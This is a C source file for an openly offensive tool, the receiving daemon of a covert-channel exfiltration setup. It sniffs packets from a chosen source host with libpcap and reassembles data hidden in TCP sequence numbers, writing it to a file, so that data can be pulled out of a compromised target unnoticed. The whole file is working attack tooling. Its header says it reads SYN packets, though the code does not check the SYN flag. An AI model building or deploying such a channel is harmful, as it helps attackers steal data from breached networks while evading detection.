/*
 * syn-daemon.c
 *
 * Exfiltrate data from a compromised target using covert channels.
 *
 * Listens passively packets, given a libpcap rule and store in a file the TCP sequence numbers of SYN packets
 * according to a given codification technique.
 *
 * (c) spinfoo <spinfoo.vuln@gmail.com>
*/

#include <pcap.h>
#include <stdio.h>
#include <stdarg.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <net/ethernet.h>
#include <netinet/ip_icmp.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>


FILE *logfile;
int total=0;

void print_tcp_packet(const u_char *buf, int s) {
	struct iphdr *iph = (struct iphdr *)(buf  + sizeof(struct ethhdr) );
	unsigned short iphdrlen= iph->ihl*4;
	struct tcphdr *tcph=(struct tcphdr*)(buf + iphdrlen + sizeof(struct ethhdr));
	int seq= ntohl(tcph->seq);
	unsigned char bytes[4];

	bytes[0] = (seq >> 24) & 0xFF;
	bytes[1] = (seq >> 16) & 0xFF;
	bytes[2] = (seq >> 8) & 0xFF;
	bytes[3] = seq & 0xFF;

	fprintf(logfile, "%c%c%c%c", bytes[0], bytes[1], bytes[2], bytes[3]);
	fflush(logfile);
	fprintf(stderr, "[SYN: %d] ", tcph->syn);
	fprintf(stderr, "[SEQ #: 0x%x]\n", seq);
}

void process_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *buffer) {
	int size = header->len;
	//Get the IP Header part of this packet , excluding the ethernet header
	struct iphdr *iph = (struct iphdr*)(buffer + sizeof(struct ethhdr));

	++total;
	fprintf(stderr, "#%5d ", total);
	if (iph->protocol == 6) {  // TCP Protocol
			print_tcp_packet(buffer, size);
	}
}

void usage(char *argv) {
	fprintf(stderr, "usage: %s -i iface -s source_ip -f file\n", argv);
}

int main(int argc, char **argv) {
	struct bpf_program fp;
	bpf_u_int32 netp, maskp;
	pcap_t *handle;
	char errbuf[PCAP_ERRBUF_SIZE], devname[64], flog[128], rule[128];
	int c;
	
	rule[0]= '\0';
	devname[0]= '\0';
	flog[0]= '\0';
	
	if (argc != 7) {
		usage(argv[0]);
		exit(EXIT_FAILURE);
	}
	
	while ((c = getopt(argc, argv, "i:s:f:")) != EOF) {
		switch (c) {
			case 'i':
				strncpy(devname, optarg, sizeof(devname)-1);
				fprintf(stderr, "using interface: %s\n", devname);
				break;
			case 's':
				snprintf(rule, sizeof(rule)-1, "src host %s", optarg);
				fprintf(stderr, "libcap rule: \"%s\"\n", rule);
				break;
			case 'f':
				strncpy(flog, optarg, sizeof(flog)-1);
				break;
			default:
				usage(argv[0]);
				exit(EXIT_FAILURE);
		}
	}
	
	if (*devname == '\0' || *rule == '\0' || *flog == '\0') {
		usage(argv[0]);
		exit(EXIT_FAILURE);
	}

	pcap_lookupnet(devname, &netp, &maskp, errbuf); 

	handle = pcap_open_live(devname, 65536, 1, 0, errbuf);
	if (handle == NULL) {
		fprintf(stderr, "Couldn't open device %s : %s\n", devname, errbuf);
		exit(EXIT_FAILURE);
	}

	logfile= fopen(flog,"w");
	if (logfile == NULL)  {
		printf("Unable to create file.");
		exit(EXIT_FAILURE);
	}

	if (pcap_compile(handle, &fp, rule, 0, netp) == -1) {
		fprintf(stderr, "Error calling pcap_compile\n");
		exit(EXIT_FAILURE);
	}

	if (pcap_setfilter(handle, &fp) == -1) {
		fprintf(stderr, "Error setting filter\n");
		exit(EXIT_FAILURE);
	}

	pcap_loop(handle, -1, process_packet, NULL);

	return 0;   
}
